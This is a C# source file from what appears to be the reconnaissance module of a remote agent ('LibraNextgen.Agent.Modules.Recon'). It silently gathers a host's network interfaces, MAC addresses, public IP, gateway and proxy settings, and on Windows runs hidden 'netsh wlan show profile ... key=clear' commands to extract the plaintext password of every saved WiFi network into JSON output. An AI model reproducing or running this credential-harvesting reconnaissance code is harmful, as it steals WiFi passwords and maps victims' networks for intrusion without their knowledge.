using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Diagnostics;

namespace LibraNextgen.Agent.Modules.Recon;

public static class NetworkInfo
{
    public static async Task<string> CollectAsync()
    {
        // LAN interfaces
        var interfaces = CollectInterfaces();

        // WAN
        var wan = await CollectWanAsync();

        // WiFi (Windows only)
        var wifi = OperatingSystem.IsWindows() ? CollectWifi() : "[]";

        // Proxy
        var proxy = OperatingSystem.IsWindows() ? CollectProxy() : CollectProxyLinux();

        var dns = Escape(IPGlobalProperties.GetIPGlobalProperties().DomainName);

        return $$"""
            {"interfaces":[{{string.Join(",", interfaces)}}],
            "wan":{{wan}},
            "wifi":{{wifi}},
            "proxy":{{proxy}},
            "dnsSuffix":"{{dns}}"}
            """;
    }

    // ── LAN ─────────────────────────────────────────────────────────────────

    private static List<string> CollectInterfaces()
    {
        var result = new List<string>();
        foreach (var n in NetworkInterface.GetAllNetworkInterfaces()
                     .Where(n => n.OperationalStatus == OperationalStatus.Up))
        {
            var props = n.GetIPProperties();
            var ipv4 = props.UnicastAddresses
                .Where(a => a.Address.AddressFamily == AddressFamily.InterNetwork)
                .Select(a => $"\"{a.Address}\"");
            var ipv6 = props.UnicastAddresses
                .Where(a => a.Address.AddressFamily == AddressFamily.InterNetworkV6)
                .Select(a => $"\"{a.Address}\"");
            result.Add($$"""
                {"name":"{{Escape(n.Name)}}",
                "type":"{{n.NetworkInterfaceType}}",
                "mac":"{{n.GetPhysicalAddress()}}",
                "speed":{{n.Speed}},
                "ipv4":[{{string.Join(",", ipv4)}}],
                "ipv6":[{{string.Join(",", ipv6)}}]}
                """);
        }
        return result;
    }

    // ── WAN ─────────────────────────────────────────────────────────────────

    private static async Task<string> CollectWanAsync()
    {
        string? publicIp = null;
        string? gateway = null;

        // Public IP via external service
        try
        {
            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };
            var resp = await client.GetStringAsync("http://api.ipify.org");
            publicIp = resp.Trim();
        }
        catch { /* ignore */ }

        // Default gateway
        try
        {
            foreach (var n in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (n.OperationalStatus != OperationalStatus.Up) continue;
                var gateways = n.GetIPProperties().GatewayAddresses;
                foreach (var g in gateways)
                {
                    if (g.Address.AddressFamily == AddressFamily.InterNetwork)
                    {
                        gateway = g.Address.ToString();
                        break;
                    }
                }
                if (gateway != null) break;
            }
        }
        catch { /* ignore */ }

        return $$"""
            {"publicIp":"{{Escape(publicIp ?? "unavailable")}}",
            "gateway":"{{Escape(gateway ?? "unknown")}}"}
            """;
    }

    // ── WiFi (Windows) ─────────────────────────────────────────────────────

    private static string CollectWifi()
    {
        var profiles = new List<string>();

        try
        {
            // Get list of profiles
            var psi = new ProcessStartInfo
            {
                FileName = "netsh",
                Arguments = "wlan show profiles",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var proc = Process.Start(psi);
            if (proc == null) return "[]";
            proc.WaitForExit(5000);
            var output = proc.StandardOutput.ReadToEnd();

            // Parse profile names
            var profileNames = new List<string>();
            foreach (var line in output.Split('\n'))
            {
                var trimmed = line.Trim();
                if (trimmed.StartsWith(": "))
                {
                    profileNames.Add(trimmed[2..].Trim());
                }
                else if (trimmed.Contains(":"))
                {
                    var parts = trimmed.Split(":", 2);
                    if (parts.Length == 2 && parts[0].Trim().Equals("All User Profile", StringComparison.OrdinalIgnoreCase))
                    {
                        profileNames.Add(parts[1].Trim());
                    }
                }
            }

            // Get password for each profile
            foreach (var name in profileNames)
            {
                try
                {
                    var psi2 = new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = $"wlan show profile name=\"{name}\" key=clear",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    using var proc2 = Process.Start(psi2);
                    if (proc2 == null) continue;
                    proc2.WaitForExit(3000);
                    var detail = proc2.StandardOutput.ReadToEnd();

                    string? password = null;
                    foreach (var line in detail.Split('\n'))
                    {
                        var t = line.Trim();
                        if (t.Contains("Key Content") && t.Contains(":"))
                        {
                            password = t.Split(":", 2)[1].Trim();
                            break;
                        }
                    }

                    profiles.Add($$"""{"ssid":"{{Escape(name)}}","password":"{{Escape(password ?? "")}}"}""");
                }
                catch { /* skip this profile */ }
            }
        }
        catch { /* ignore */ }

        return $"[{string.Join(",", profiles)}]";
    }

    // ── Proxy (Windows) ────────────────────────────────────────────────────

    private static string CollectProxy()
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "reg",
                Arguments = @"query ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings""",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var proc = Process.Start(psi);
            if (proc == null) return DefaultProxyJson();
            proc.WaitForExit(3000);
            var output = proc.StandardOutput.ReadToEnd();

            var enabled = false;
            var server = "";
            var bypass = "";

            foreach (var line in output.Split('\n'))
            {
                var t = line.Trim();
                if (t.Contains("ProxyEnable"))
                {
                    if (t.Contains("0x1")) enabled = true;
                }
                else if (t.Contains("ProxyServer") && t.Contains("REG_SZ"))
                {
                    var sep = t.IndexOf("REG_SZ");
                    server = t[(sep + "REG_SZ".Length)..].Trim();
                }
                else if (t.Contains("ProxyOverride") && t.Contains("REG_SZ"))
                {
                    var sep = t.IndexOf("REG_SZ");
                    bypass = t[(sep + "REG_SZ".Length)..].Trim();
                }
            }

            var port = 0;
            if (server.Contains(":"))
            {
                var parts = server.Split(":");
                if (parts.Length == 2 && int.TryParse(parts[1], out var p))
                    port = p;
            }

            return $$"""
                {"enabled":{{enabled.ToString().ToLowerInvariant()}},
                "server":"{{Escape(server)}}",
                "port":{{port}},
                "bypass":"{{Escape(bypass)}}"}
                """;
        }
        catch { /* ignore */ }
        return DefaultProxyJson();
    }

    private static string DefaultProxyJson() =>
        """{"enabled":false,"server":"","port":0,"bypass":""}""";

    // ── Proxy (Linux) ──────────────────────────────────────────────────────

    private static string CollectProxyLinux()
    {
        var httpProxy = Environment.GetEnvironmentVariable("HTTP_PROXY")
                     ?? Environment.GetEnvironmentVariable("http_proxy") ?? "";
        var httpsProxy = Environment.GetEnvironmentVariable("HTTPS_PROXY")
                       ?? Environment.GetEnvironmentVariable("https_proxy") ?? "";
        var noProxy = Environment.GetEnvironmentVariable("NO_PROXY")
                    ?? Environment.GetEnvironmentVariable("no_proxy") ?? "";

        var allProxy = !string.IsNullOrEmpty(httpsProxy) ? httpsProxy : httpProxy;
        return $$"""
            {"enabled":{{(!string.IsNullOrEmpty(allProxy)).ToString().ToLowerInvariant()}},
            "server":"{{Escape(allProxy ?? "")}}",
            "port":0,
            "bypass":"{{Escape(noProxy)}}"}
            """;
    }

    private static string Escape(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
}
